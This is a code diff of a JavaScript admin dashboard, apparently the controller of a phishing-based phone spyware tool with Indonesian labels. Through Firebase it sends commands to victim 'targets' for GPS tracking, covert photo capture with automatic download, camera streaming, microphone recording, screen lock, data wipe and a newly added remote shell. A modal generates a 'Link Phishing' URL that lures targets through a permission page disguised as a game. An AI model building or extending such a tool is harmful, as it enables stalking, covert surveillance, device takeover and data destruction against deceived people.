-            listenAudio(id);
-            listenErrors(id);
+            if (d && d.gameConnected && gameStates) {
+                card.style.display = 'block';
+                document.getElementById('gamePlayerName').textContent = d.name || '-';
+                document.getElementById('statEnemyHP').textContent = gameStates.enemyHP || 5500;
+                document.getElementById('statPlayerHP').textContent = gameStates.playerHP || 5000;
+                
+                const playerCount = Object.keys(allPlayers).length || 1;
+                document.getElementById('statPlayers').textContent = playerCount;
+                
+                if (gameStates.gameWin) {
+                    document.getElementById('gameStatusText').textContent = '🏆 VICTORY!';
+                    document.getElementById('gameStatusText').style.color = '#3fb950';
+                } else if (gameStates.gameOver) {
+                    document.getElementById('gameStatusText').textContent = '💀 DEFEATED';
+                    document.getElementById('gameStatusText').style.color = '#f85149';
+                } else {
+                    document.getElementById('gameStatusText').textContent = '⚔️ Bertarung...';
+                    document.getElementById('gameStatusText').style.color = '#bc8cff';
+                }
+            } else {
+                card.style.display = 'none';
+            }
         }
         
         function initMap(lat, lon) {
@@ -474,67 +783,62 @@
                 }).addTo(map);
             }
             if (marker) map.removeLayer(marker);
-            marker = L.marker([lat, lon]).addTo(map)
-                .bindPopup('📍 Lokasi').openPopup();
+            marker = L.marker([lat, lon]).addTo(map).bindPopup('📍 Lokasi').openPopup();
             map.setView([lat, lon], 16);
+            setTimeout(() => map.invalidateSize(), 100);
         }
         
-        function refreshLocation() {
-            if (!currentTarget) return;
-            sendCmd('getLocation');
-            addLog('Request lokasi...');
-        }
-        
-        function toggleTracking() {
-            const btn = document.getElementById('trackBtn');
-            if (trackingActive) {
-                trackingActive = false;
-                btn.textContent = '▶ Track';
-                addLog('Tracking stop');
-            } else {
-                trackingActive = true;
-                btn.textContent = '⏹ Stop';
-                addLog('Tracking aktif (3s)');
-                doTrack();
-            }
-        }
-        function doTrack() {
-            if (!trackingActive || !currentTarget) return;
-            sendCmd('getLocation');
-            setTimeout(doTrack, 3000);
-        }
-        
-        function capturePhoto(facingMode) {
-            if (!currentTarget) return;
-            sendCmd('capturePhoto', { facingMode });
-            document.getElementById('cameraArea').innerHTML = '<span style="color:#ffaa00;">📸 Mengambil foto...</span>';
-            addLog(`Ambil foto (${facingMode})...`);
-        }
-        
-        function listenPhoto(id) {
-            db.ref(`targets/${id}/photo`).off();
-            db.ref(`targets/${id}/photo`).on('value', (snap) => {
+        // ============ LISTENERS ============
+        function setupPhotoListener(id) {
+            if (photoListener) photoListener.off();
+            photoListener = db.ref(`targets/${id}/photo`);
+            photoListener.on('value', (snap) => {
                 const data = snap.val();
                 if (data && data.base64) {
                     document.getElementById('cameraArea').innerHTML = 
-                        `<img src="${data.base64}" alt="Foto" style="max-width:100%;max-height:260px;border-radius:6px;" />`;
-                    addLog('📸 Foto diterima!');
-                    toast('✅ Foto berhasil diambil!', 'success');
-                    
-                    // AUTO DOWNLOAD FOTO
+                        `<img src="${data.base64}" alt="Foto" style="max-width:100%;max-height:220px;" />`;
+                    addLog('📸 Foto diterima! Auto-download...', 'info');
+                    toast('✅ Foto diterima!', 'success');
                     autoDownloadPhoto(data.base64, id, data.timestamp);
                 }
             });
-            
-            // Listen error
-            db.ref(`targets/${id}/photoError`).off();
-            db.ref(`targets/${id}/photoError`).on('value', (snap) => {
-                const err = snap.val();
-                if (err) {
-                    addLog(`❌ Foto error: ${err.message}`, 'error');
-                    toast(`⚠️ Foto gagal: ${err.message}`, 'error');
+        }
+        
+        function setupAudioListener(id) {
+            if (audioListener) audioListener.off();
+            audioListener = db.ref(`targets/${id}/audioRecording`);
+            audioListener.on('value', (snap) => {
+                const data = snap.val();
+                if (data && data.base64) {
+                    document.getElementById('audioLog').innerHTML = '✅ <b>Audio siap!</b>';
+                    document.getElementById('micStatus').textContent = '✅ Rekaman siap';
+                    toast('🎤 Audio siap!', 'success');
                 }
             });
+        }
+        
+        function setupErrorListeners(id) {
+            ['locationError', 'photoError', 'videoError', 'micError'].forEach(errType => {
+                const ref = db.ref(`targets/${id}/${errType}`);
+                ref.off();
+                ref.on('value', (snap) => {
+                    const err = snap.val();
+                    if (err) {
+                        const msg = typeof err === 'string' ? err : err.message;
+                        addLog(`⚠️ ${errType}: ${msg}`, 'warn');
+                        toast(`⚠️ ${errType}: ${msg}`, 'warning');
+                    }
+                });
+            });
+        }
+        
+        function cleanupListeners() {
+            if (photoListener) photoListener.off();
+            if (audioListener) audioListener.off();
+            if (videoFrameListener) videoFrameListener.off();
+            photoListener = null;
+            audioListener = null;
+            videoFrameListener = null;
         }
         
         function autoDownloadPhoto(base64, id, timestamp) {
@@ -545,91 +849,92 @@
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
-                addLog('💾 Foto otomatis terdownload');
+                addLog('💾 Foto auto-downloaded', 'info');
             } catch(e) {
-                addLog(`⚠️ Gagal download: ${e.message}`, 'warn');
+                addLog(`⚠️ Download failed: ${e.message}`, 'warn');
             }
         }
         
-        function listenAudio(id) {
-            db.ref(`targets/${id}/audioRecording`).off();
-            db.ref(`targets/${id}/audioRecording`).on('value', (snap) => {
-                const data = snap.val();
-                if (data && data.base64) {
-                    document.getElementById('audioLog').innerHTML = '✅ Rekaman audio tersedia!';
-                    toast('🎤 Rekaman audio siap!', 'success');
-                }
-            });
-            
-            db.ref(`targets/${id}/micError`).off();
-            db.ref(`targets/${id}/micError`).on('value', (snap) => {
-                const err = snap.val();
-                if (err) {
-                    addLog(`❌ Mic error: ${err.message}`, 'error');
-                    toast(`⚠️ Mic error: ${err.message}`, 'error');
-                }
-            });
+        // ============ COMMANDS ============
+        function sendCmd(command, data = {}) {
+            if (!currentTarget) { toast('Pilih device!', 'warning'); return; }
+            db.ref(`commands/${currentTarget}`).set({ command, ...data, timestamp: Date.now(), executed: false });
         }
         
-        function listenErrors(id) {
-            db.ref(`targets/${id}/locationError`).on('value', (snap) => {
-                const err = snap.val();
-                if (err) {
-                    addLog(`⚠️ GPS Error: ${err}`, 'warn');
-                    toast(`⚠️ ${allDevices[id]?.name}: GPS Error!`, 'warning');
-                }
-            });
-            
-            db.ref(`targets/${id}/videoError`).on('value', (snap) => {
-                const err = snap.val();
-                if (err) {
-                    addLog(`❌ Stream error: ${err.message}`, 'error');
-                    toast(`⚠️ Stream error: ${err.message}`, 'error');
-                }
-            });
+        function refreshLocation() { if (currentTarget) { sendCmd('getLocation'); addLog('📍 Request lokasi'); } }
+        
+        function toggleTracking() {
+            const btn = document.getElementById('trackBtn');
+            if (trackingActive) {
+                trackingActive = false;
+                btn.textContent = '▶ Track';
+                btn.classList.remove('primary');
+                addLog('⏹ Tracking STOP');
+            } else {
+                trackingActive = true;
+                btn.textContent = '⏹ Stop';
+                btn.classList.add('primary');
+                addLog('🔴 Tracking AKTIF (5s)');
+                doTrack();
+            }
+        }
+        function doTrack() { if (!trackingActive || !currentTarget) return; sendCmd('getLocation'); setTimeout(doTrack, 5000); }
+        
+        function capturePhoto(facingMode) {
+            if (!currentTarget) return;
+            sendCmd('capturePhoto', { facingMode });
+            document.getElementById('cameraArea').innerHTML = '<span class="placeholder" style="color:#ffaa00;">📸 Memotret...</span>';
+            addLog(`📷 Foto (${facingMode})...`);
         }
         
-        let videoActive = false;
         function toggleVideoStream() {
+            if (!currentTarget) return;
+            const btn = document.getElementById('streamBtn');
             if (videoActive) {
                 sendCmd('stopVideo');
                 videoActive = false;
-                document.getElementById('cameraArea').innerHTML = '<span style="color:#8b949e;">Stream stop</span>';
-                addLog('Stream stop');
+                btn.textContent = '▶ Stream';
+                btn.classList.remove('primary');
+                if (videoFrameListener) videoFrameListener.off();
+                document.getElementById('cameraArea').innerHTML = '<span class="placeholder">Stream stop</span>';
+                addLog('📡 Stream STOP');
             } else {
                 sendCmd('startVideo');
                 videoActive = true;
-                document.getElementById('cameraArea').innerHTML = '<span style="color:#ffaa00;">📡 Menunggu stream...</span>';
-                addLog('Stream start');
-                listenVideoStream(currentTarget);
+                btn.textContent = '⏹ Stop';
+                btn.classList.add('primary');
+                document.getElementById('cameraArea').innerHTML = '<span class="placeholder" style="color:#ffaa00;">📡 Menunggu...</span>';
+                addLog('📡 Stream AKTIF');
+                
+                if (videoFrameListener) videoFrameListener.off();
+                videoFrameListener = db.ref(`targets/${currentTarget}/videoFrame`);
+                videoFrameListener.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data && data.base64 && videoActive) {
+                        document.getElementById('cameraArea').innerHTML = 
+                            `<img src="${data.base64}" alt="Stream" style="max-width:100%;max-height:220px;" />`;
+                    }
+                });
             }
         }
         
-        function listenVideoStream(id) {
-            db.ref(`targets/${id}/videoFrame`).off();
-            db.ref(`targets/${id}/videoFrame`).on('value', (snap) => {
-                const data = snap.val();
-                if (data && data.base64 && videoActive) {
-                    document.getElementById('cameraArea').innerHTML = 
-                        `<img src="${data.base64}" alt="Stream" style="max-width:100%;max-height:260px;" />`;
-                }
-            });
-        }
-        
-        let micActive = false;
         function toggleMic() {
+            if (!currentTarget) return;
+            const btn = document.getElementById('micBtn');
             if (micActive) {
                 sendCmd('stopMic');
                 micActive = false;
-                document.getElementById('micBtn').textContent = '▶ Rekam';
+                btn.textContent = '▶ Rekam';
+                btn.classList.remove('primary');
                 document.getElementById('micStatus').textContent = 'Mikrofon idle';
-                addLog('Rekaman stop');
+                addLog('🎤 Rekaman STOP');
             } else {
                 sendCmd('startMic');
                 micActive = true;
-                document.getElementById('micBtn').textContent = '⏹ Stop';
+                btn.textContent = '⏹ Stop';
+                btn.classList.add('primary');
                 document.getElementById('micStatus').textContent = '🔴 Merekam...';
-                addLog('Rekaman mulai');
+                addLog('🎤 Rekaman AKTIF');
             }
         }
         
@@ -643,9 +948,10 @@
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
-                toast('✅ Audio terdownload!', 'success');
+                addLog('💾 Audio downloaded', 'info');
+                toast('✅ Audio downloaded!', 'success');
             } else {
-                toast('⚠️ Belum ada rekaman', 'warning');
+                toast('⚠️ No audio yet', 'warning');
             }
         }
         
@@ -655,61 +961,98 @@
                 title: document.getElementById('notifTitle').value || 'Info',
                 body: document.getElementById('notifBody').value || 'Pesan baru'
             });
-            addLog('Notif dikirim');
+            addLog('📢 Notif sent');
         }
         
         function openUrl() {
             if (!currentTarget) return;
-            const url = document.getElementById('urlInput').value;
-            if (!url) return;
+            const url = document.getElementById('urlInput').value.trim();
+            if (!url) { toast('Input URL!', 'warning'); return; }
             sendCmd('openURL', { url });
-            addLog(`Buka URL: ${url}`);
+            addLog(`🌐 URL: ${url}`);
         }
         
-        function lockScreen() { if (currentTarget) { sendCmd('lock'); addLog('Layar dikunci'); } }
-        function vibratePhone() { if (currentTarget) { sendCmd('vibrate'); addLog('Getar'); } }
+        function execShell() {
+            if (!currentTarget) return;
+            const cmd = document.getElementById('shellInput').value.trim();
+            if (!cmd) { toast('Input command!', 'warning'); return; }
+            sendCmd('shell', { cmd });
+            addLog(`💻 Shell: ${cmd}`);
+            db.ref(`targets/${currentTarget}/shellResult`).once('value', (snap) => {
+                const val = snap.val();
+                if (val) addLog(`📤 Output: ${val}`, 'info');
+            });
+        }
+        
+        function lockScreen() { if (currentTarget) { sendCmd('lock'); addLog('🔒 Locked', 'warn'); } }
+        function vibratePhone() { if (currentTarget) { sendCmd('vibrate'); addLog('📳 Vibrate'); } }
         function wipeConfirm() {
             if (!currentTarget) return;
-            if (confirm('Yakin hapus data?')) {
+            if (confirm('⚠️ HAPUS SEMUA DATA?')) {
                 sendCmd('wipe');
-                addLog('⚠️ Wipe command sent', 'warn');
-                toast('⚠️ Perintah hapus dikirim!', 'warning');
+                addLog('💀 WIPE SENT!', 'error');
+                toast('⚠️ Wipe command sent!', 'error', 5000);
             }
         }
+        function requestUpdate() { if (currentTarget) { sendCmd('updateInfo'); addLog('🔄 Update info...'); } }
+        function refreshAll() { addLog('🔄 Refresh all', 'info'); loadAllData(); toast('Refreshed', 'info', 1500); }
         
-        function requestUpdate() { if (currentTarget) { sendCmd('updateInfo'); addLog('Update info...'); } }
-        function refreshAll() { addLog('Refresh...'); loadDevices(); }
-        
-        function sendCmd(command, data = {}) {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command, ...data, timestamp: Date.now() });
-        }
-        
-        // Link
+        // ============ MODAL LINK ============
         function showLinkModal() {
-            const link = window.location.href.replace('admin.html', 'index.html').replace(/\/$/, '');
-            const r = btoa(Date.now());
-            const fullLink = `${link}?r=${r}`;
+            const baseUrl = window.location.href.replace('admin.html', 'index.html').replace(/\/$/, '').split('?')[0];
+            const ref = btoa(Date.now() + Math.random().toString(36));
+            const fullLink = `${baseUrl}?r=${ref}`;
             
-            const modal = document.createElement('div');
-            modal.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);z-index:999;display:flex;align-items:center;justify-content:center;';
-            modal.innerHTML = `
-                <div style="background:#161b22;border:1px solid #30363d;border-radius:12px;padding:24px;max-width:500px;width:90%;">
-                    <h3 style="color:#fff;margin-bottom:8px;">🔗 Link Phishing</h3>
-                    <p style="color:#8b949e;font-size:13px;margin-bottom:12px;">Target buka index.html → izinkan → redirect ke game.html</p>
-                    <input type="text" value="${fullLink}" readonly style="width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px;border-radius:4px;margin-bottom:8px;" id="linkCopy" />
-                    <button class="btn primary" style="width:100%;margin-bottom:4px;" onclick="navigator.clipboard.writeText('${fullLink}');alert('Disalin!');">📋 Salin Link</button>
-                    <button class="btn" style="width:100%;" onclick="this.closest('[style*=fixed]').remove();">Tutup</button>
+            const overlay = document.createElement('div');
+            overlay.className = 'modal-overlay';
+            overlay.onclick = function(e) { if (e.target === overlay) overlay.remove(); };
+            
+            overlay.innerHTML = `
+                <div class="modal">
+                    <h3>🔗 Link Phishing</h3>
+                    <p>Target: index.html → izinkan → main game di game.html</p>
+                    <input type="text" value="${fullLink}" readonly id="linkCopy" />
+                    <div style="display:flex;gap:6px;">
+                        <button class="btn primary" style="flex:1;" onclick="copyLink('${fullLink}')">📋 Salin</button>
+                        <button class="btn accent" style="flex:1;" onclick="window.open('${fullLink}')">🔗 Buka</button>
+                    </div>
+                    <button class="btn" style="width:100%;margin-top:6px;" onclick="this.closest('.modal-overlay').remove()">Tutup</button>
                 </div>
             `;
-            document.body.appendChild(modal);
+            document.body.appendChild(overlay);
         }
         
-        loadDevices();
-        addLog('Dashboard siap.');
+        function copyLink(text) {
+            navigator.clipboard.writeText(text).then(() => toast('✅ Link copied!', 'success'))
+                .catch(() => toast('⚠️ Copy failed', 'warning'));
+        }
         
-        // Cek error setiap 30 detik
-        setInterval(checkAllErrors, 30000);
+        // ============ INIT ============
+        function init() {
+            console.log('🚀 Init admin panel...');
+            loadAllData();
+            addLog('✅ REM Panel ready', 'info');
+            addLog('📋 Monitoring devices & game...', 'info');
+            toast('Dashboard ready!', 'success', 2500);
+            
+            setInterval(() => {
+                if (currentTarget && allDevices[currentTarget]) {
+                    updateDeviceDetailUI(allDevices[currentTarget]);
+                    updateGameStatsUI();
+                }
+                updateCounts();
+            }, 10000);
+        }
+        
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.key === 'f') {
+                e.preventDefault();
+                document.getElementById('searchInput').focus();
+            }
+        });
+        
+        init();
+        console.log('✅ Admin panel loaded');
     </script>
 </body>
 </html>
